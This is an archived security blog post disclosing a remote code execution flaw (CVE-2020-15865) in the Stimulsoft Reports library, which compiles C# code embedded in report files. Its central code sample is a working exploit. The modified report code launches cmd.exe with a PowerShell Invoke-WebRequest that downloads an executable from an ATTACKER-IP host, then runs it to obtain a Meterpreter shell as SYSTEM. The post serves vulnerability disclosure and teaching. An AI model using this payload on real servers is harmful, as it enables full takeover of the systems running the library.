=== Content from burninatorsec.blogspot.com_10341eaa_20250119_120915.html ===


# [Burninator Sec](http://burninatorsec.blogspot.com/)

This blog is about the educational (and sometimes entertainment) value of simple hacks. For active vulnerabilities, real names are concealed.

## Friday, November 23, 2018

### CVE-2020-15865 - Reporting C# Serialization: Remote Code Execution

The Stimulsoft Reports 2013.1.1600.0 library has code execution built in by design, and can be used to fully compromise the application server running it. Buried in the XML of the report file is a base-64 encoded string that contains C# code that a user can edit, then re-encode, submit, and execute.

It's pretty clear that the code is compiled and run, because the comments say "generated code - do not modify."

... so, of course, let's modify it!

I have to do a lot of testing at this point to make sure that modifying the code doesn't completely break it. After all, I still need it to run, I just want it to also run *my* code! The application kept crashing as I tried importing other namespaces that I could use, such as one for writing to the operating system (using System.IO). Looks like some of this namespaces are blacklisted, which is smart. It's making it difficult for me to get in.

Eventually the one able to add, without causing errors, is using System.Diagnostics. Which means I can use Process() to start a cmd.exe process and then use a Powershell command to download a payload and get a command shell with Meterpreter. That's what I do. With the malicious changes (in red), it looks like:

<script>

using System.Diagnostics;

namespace Reports {

    public class New\_Report : Stimulsoft.Report.StiReport

    {

        public New\_Report()

        {

            this.InitializeComponent();

            Process c = newProcess();
            c.StartInfo.FileName = @"cmd.exe";
            c.StartInfo.Arguments = @"/c powershell Invoke-WebRequest -Uri http://ATTACKER-IP/scary.exe -Outfile C:\ProgramData\scary.exe";
            c.Start();

            Process c1 = new Process();
            c1.StartInfo.FileName = @"cmd.exe";
            c1.StartInfo.Arguments = @"/c C:\ProgramData\scary.exe";
            c1.Start();

        }

        #region StiReport Designer generated code - do not modify

            #endregion StiReport Designer generated code - do not modify

    }

}

</script>

Since this application is running as user NT AUTHORITY\SYSTEM, the Meterpreter shell returned to the attacker is also running as root.

*Some disclaimers: it took a little discovery and trial and error to figure out that the server was running Windows, and which directory I would be able to download the payload to, permissions for executing Powershell scripts etc. Also, depending on how fast the download is, the attacker may have to download and execute the payload in two separate scripts.*

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15865

Posted by
burninator

at

[9:50 AM](http://burninatorsec.blogspot.com/2018/11/reporting-c-serialization-remote-code.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=5709475200071837744&postID=3622820387225864110&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=5709475200071837744&postID=3622820387225864110&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=5709475200071837744&postID=3622820387225864110&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=5709475200071837744&postID=3622820387225864110&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=5709475200071837744&postID=3622820387225864110&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=5709475200071837744&postID=3622820387225864110&target=pinterest "Share to Pinterest")

Labels:
[base 64](http://burninatorsec.blogspot.com/search/label/base%2064),
[C#](http://burninatorsec.blogspot.com/search/label/C%23),
[CVE](http://burninatorsec.blogspot.com/search/label/CVE),
[external libraries](http://burninatorsec.blogspot.com/search/label/external%20libraries),
[kali](http://burninatorsec.blogspot.com/search/label/kali),
[metasploit](http://burninatorsec.blogspot.com/search/label/metasploit),
[meterpreter](http://burninatorsec.blogspot.com/search/label/meterpreter),
[nt authority\system](http://burninatorsec.blogspot.com/search/label/nt%20authority%5Csystem),
[powershell](http://burninatorsec.blogspot.com/search/label/powershell),
[remote code execution](http://burninatorsec.blogspot.com/search/label/remote%20code%20execution),
[root](http://burninatorsec.blogspot.com/search/label/root),
[serialization](http://burninatorsec.blogspot.com/search/label/serialization)

#### No comments:

#### Post a Comment

[Newer Post](http://burninatorsec.blogspot.com/2019/05/bypass-auth-lib.html "Newer Post")

[Older Post](http://burninatorsec.blogspot.com/2018/08/paywalls-and-redirects.html "Older Post")

[Home](http://burninatorsec.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](http://burninatorsec.blogspot.com/feeds/3622820387225864110/comments/default)

## Twitter

@burninatorsec

## Disclaimer

Information in this blog is for educational purposes only. I am not liable for damages or illegal activity caused directly or indirectly based on the information shared here.

## Archive

* ►
  [2024](http://burninatorsec.blogspot.com/2024/)
  (1)
  + ►
    [November](http://burninatorsec.blogspot.com/2024/11/)
    (1)

* ►
  [2022](http://burninatorsec.blogspot.com/2022/)
  (6)
  + ►
    [December](http://burninatorsec.blogspot.com/2022/12/)
    (1)
  + ►
    [November](http://burninatorsec.blogspot.com/2022/11/)
    (2)
  + ►
    [July](http://burninatorsec.blogspot.com/2022/07/)
    (1)
  + ►
    [April](http://burninatorsec.blogspot.com/2022/04/)
    (1)
  + ►
    [January](http://burninatorsec.blogspot.com/2022/01/)
    (1)

* ►
  [2021](http://burninatorsec.blogspot.com/2021/)
  (8)
  + ►
    [July](http://burninatorsec.blogspot.com/2021/07/)
    (1)
  + ►
    [June](http://burninatorsec.blogspot.com/2021/06/)
    (1)
  + ►
    [April](http://burninatorsec.blogspot.com/2021/04/)
    (6)

* ►
  [2020](http://burninatorsec.blogspot.com/2020/)
  (7)
  + ►
    [November](http://burninatorsec.blogspot.com/2020/11/)
    (1)
  + ►
    [October](http://burninatorsec.blogspot.com/2020/10/)
    (2)
  + ►
    [September](http://burninatorsec.blogspot.com/2020/09/)
    (1)
  + ►
    [August](http://burninatorsec.blogspot.com/2020/08/)
    (1)
  + ►
    [April](http://burninatorsec.blogspot.com/2020/04/)
    (2)

* ►
  [2019](http://burninatorsec.blogspot.com/2019/)
  (5)
  + ►
    [July](http://burninatorsec.blogspot.com/2019/07/)
    (2)
  + ►
    [June](http://burninatorsec.blogspot.com/2019/06/)
    (1)
  + ►
    [May](http://burninatorsec.blogspot.com/2019/05/)
    (2)

* ▼
  [2018](http://burninatorsec.blogspot.com/2018/)
  (8)
  + ▼
    [November](http://burninatorsec.blogspot.com/2018/11/)
    (1)
    - [CVE-2020-15865 - Reporting C# Serialization: Remot...](http://burninatorsec.blogspot.com/2018/11/reporting-c-serialization-remote-code.html)
  + ►
    [August](http://burninatorsec.blogspot.com/2018/08/)
    (1)
  + ►
    [July](http://burninatorsec.blogspot.com/2018/07/)
    (3)
  + ►
    [May](http://burninatorsec.blogspot.com/2018/05/)
    (1)
  + ►
    [April](http://burninatorsec.blogspot.com/2018/04/)
    (1)
  + ►
    [March](http://burninatorsec.blogspot.com/2018/03/)
    (1)

* ►
  [2014](http://burninatorsec.blogspot.com/2014/)
  (1)
  + ►
    [November](http://burninatorsec.blogspot.com/2014/11/)
    (1)

* ►
  [2013](http://burninatorsec.blogspot.com/2013/)
  (8)
  + ►
    [October](http://burninatorsec.blogspot.com/2013/10/)
    (1)
  + ►
    [August](http://burninatorsec.blogspot.com/2013/08/)
    (1)
  + ►
    [July](http://burninatorsec.blogspot.com/2013/07/)
    (1)
  + ►
    [June](http://burninatorsec.blogspot.com/2013/06/)
    (5)

|  |  |
| --- | --- |

Awesome Inc. theme. Powered by [Blogger](https://www.blogger.com).


